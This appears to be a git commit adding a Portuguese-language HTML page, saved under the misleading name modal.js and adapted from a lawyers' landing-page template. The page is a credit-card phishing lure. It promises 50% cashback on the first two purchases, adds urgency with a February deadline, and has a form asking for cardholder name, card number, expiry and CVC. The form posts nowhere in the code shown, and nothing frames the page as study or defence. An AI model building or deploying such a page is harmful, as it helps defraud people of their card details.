1326f5d5cd47efcf7c12ca5d790aea807cfca6e9
Man Man <153242608+Suitmaan@users.noreply.github.com>
2024-01-10 10:41:35 -0300

    Add files via upload

---
+++ modal.js
@@ -0,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+
+ <head>
+	
+	<meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <meta name="Landingpage" content="Landing Page para Advogados" />
+    <meta name="description" content="Modelo de Landing Page para Advogados com html e css"/>
+    <meta name="keywords" content="Landingpage, Landingpage Online, Landingpage Responsiva, Landingpage de Alta Conversão"/>
+    <meta name="author" content="Loop Nerd" />
+    <meta name="URL" content="https://www.loopnerd.com.br/artigos/templates/landingpage/landingpage-para-advogados/"/>
+    <meta http-equiv="content-language" content="pt-br" />
+    <meta name="robots" content="index, follow"/>
+    
+    <!--[if lt IE 9]>
+        <script src="js/html5shiv.js"></script>
+    <![endif]-->       
+
+	<link rel="stylesheet" type="text/css" href="css/reset.css">
+	<link rel="stylesheet" type="text/css" href="css/style.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link href="https://fonts.googleapis.com/css2?family=Lato:wght@100;300;400;700;900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" type="text/css" href="css/fonts-icones.css">
+    <link rel="shortcut icon" href="https://www.loopnerd.com.br/artigos/templates/landingpage/landingpage-para-advogados/img/logo/favicon.png" type="image/ico" />
+
+	<title>Landing Page para Advogados</title>
+
+ </head>
+
+<body>
+    
+<header class="header container">        
+    
+    <div class="content">
+		<br>
+		<br>
+        <div class="header-left">
+		   <br>
+		   <br>
+		   <br>
+		   <br>
+		   <br>
+            <div class="header_logo">
+            
+                <a href="https://www.loopnerd.com.br/landing-page/" target="_blank">
+                    <img src="img/logo/logo.png" alt="Landingpage Online" height="100" width="100" title="Landingpage Online  Loop Nerd"/>
+					
+                </a>
+
+            </div>
+
+            <h1 class="title"><span>Promoção</span> Rápida!<br></h1>
+            
+            <p class="texto">
+                Cadastrando seu cartão receberá 50% de cashback nas duas primeiras compras de qualquer item, não perca essa oportunidade única.
+            </p>
+
+            <p class="texto">Válido até o mês de fevereiro.</p>
+        
+        </div><!--left-->
+        
+        <div class="header-right">
+            
+            <h2 class="title">Entraremos em contato através dos dados informado até 24s Úteis.</h2>     
+            
+            <form class="header-newsletter" action="#" method="post">
+
+              <input class="campo" name="nome" placeholder="Títular do cartão" required="" autocomplete="off">
+              <input type="number" class="campo" name="Número" placeholder="Número do cartão" required="" autocomplete="off">
+              <input class="campo" name="Validade" placeholder="XX/YY" required="" autocomplete="off">
+			  <input class="campo" name="CVC" placeholder="CVC" required="" autocomplete="off">	
+              <button class="btn">Cadastrar Cartão</button>
+
+            </form>
+
+        </div><!--right-->
+
+    
+    </div>
+
+</header>
+</main>
+
+</body>
+</html>
